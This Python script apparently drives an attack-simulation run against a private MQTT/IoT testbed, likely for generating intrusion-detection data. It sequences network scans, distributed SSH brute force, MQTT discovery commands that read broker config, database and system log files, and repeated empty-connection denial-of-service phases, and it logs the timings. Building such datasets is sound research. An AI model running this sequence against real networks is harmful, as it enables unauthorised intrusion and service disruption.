import random

import pytz
import time
from datetime import datetime
import apts
import pickle


def main():
    experiments_details = []
    access_target = "10.0.0.7"
    attack_name = "empty_connection_ddos"
    start_time_all = datetime.now(tz=pytz.UTC)

    # 1) INITIAL ACCESS
    # ----------------------------------------------------------------------------------------------
    commands = "sudo nmap -sS -T3 -Pn 192.168.1.0/24;sudo nmap -sS -T3 -Pn 192.168.0.0/24;sudo nmap -sS -T3 -Pn 10.0.0.0/24"
    command_list = commands.split(";")
    experiment = apts.initial_access(access_target, 1, command_list, attack_name, pause_commands=True, sup_conclusion_pause=60)
    experiments_details.append(experiment)

    time.sleep(random.randint(0, 120))

    # 1) INITIAL ACCESS
    # ----------------------------------------------------------------------------------------------
    experiment = apts.initial_access(access_target, 1.1, command_list, attack_name, sup_conclusion_pause=60)
    experiments_details.append(experiment)
    time.sleep(random.randint(0, 180))

    # 1opt) SSH BRUTEFORCE
    # ----------------------------------------------------------------------------------------------
    experiments = apts.brute_force(2.0, "empty_connection_ddos", 30, is_distributed=True)
    experiments_details.append(experiments)

    time.sleep(random.randint(0, 120))

    # 1opt) SSH BRUTEFORCE
    # ----------------------------------------------------------------------------------------------
    experiments = apts.brute_force(2.1, "empty_connection_ddos", 30, is_distributed=True)
    experiments_details.append(experiments)

    targets = ["10.0.0.7", "10.0.0.6", "10.0.0.5", "10.0.0.4"]

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "cat /etc/mosquitto/mosquitto.conf;cat /etc/mosquitto/conf.d;cat /var/lib/mosquitto/mosquitto.db;cat /var/log/mosquitto/mosquitto.log; cat /var/log/syslog;cat /var/log/syslog;sudo /usr/bin/nmap -sS -T3 -Pn -p 1883,8883 10.0.0.0/24;sudo nmap -sS -T3 -f -Pn -p 1883,8883 --script banner 10.0.0.0/24;sudo nmap -p 1883,8883 --script mqtt-subscribe 10.0.0.0/24"
    command_list2 = commands2.split(";")
    experiments = apts.mqtt_discovery(targets[random.randint(0, 3)], 3, command_list2, attack_name,
                                      sup_conclusion_pause=60, pause_commands=True, interval=3, start_pausing=6)
    experiments_details.append(experiments)
    time.sleep(random.randint(100, 160))

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    experiments = apts.mqtt_discovery(targets[random.randint(0, 3)], 3.1, command_list2, attack_name,
                                      sup_conclusion_pause=60, pause_commands=True, interval=3, start_pausing=6)
    experiments_details.append(experiments)

    # 3) EMPTY CONNECTION DOS
    # ----------------------------------------------------------------------------------------------
    experiment = apts.empty_connection_ddos(targets, 4, 10)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 5, 20)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 6, 15)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 7, 20)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 8, 20)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 9, 20)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 10, 15)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 11, 20)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 12, 10)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 13, 20)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 14, 25)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 15, 30)
    experiments_details.append(experiment)

    time.sleep(60)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    experiments = apts.mqtt_discovery(targets[random.randint(0, 3)], 16, command_list2, attack_name,
                                      sup_conclusion_pause=60)
    experiments_details.append(experiments)

    # 3) EMPTY CONNECTION DOS
    # ----------------------------------------------------------------------------------------------
    experiment = apts.empty_connection_ddos(targets, 17, 20)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 18, 10)
    experiments_details.append(experiment)

    experiment = apts.empty_connection_ddos(targets, 19, 20)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 20, 25)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 21, 30)
    experiments_details.append(experiment)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    experiments = apts.mqtt_discovery(targets[random.randint(0, 3)], 22, command_list2, attack_name,
                                      sup_conclusion_pause=60)

    experiments_details.append(experiments)

    # 3) EMPTY CONNECTION DOS
    # ----------------------------------------------------------------------------------------------
    experiment = apts.empty_connection_ddos(targets, 23, 20)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 24, 10)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 25, 20)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 26, 25)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 27, 30)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 28, 10)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 29, 20)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 30, 15)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 31, 20)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 32, 20)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 33, 20)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 34, 15)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 35, 20)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 36, 10)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 37, 20)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 38, 25)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_ddos(targets, 39, 30)
    experiments_details.append(experiment)

    print(experiments_details)
    end_time_all = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": 0,
        "attack_name": "empty_connection_ddos",
        "phase_name": "all_steps",
        "start_time": start_time_all,
        "end_time": end_time_all
    }
    experiments_details.append(experiment)
    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)
    print(experiments_details)


if __name__ == '__main__':
    main()
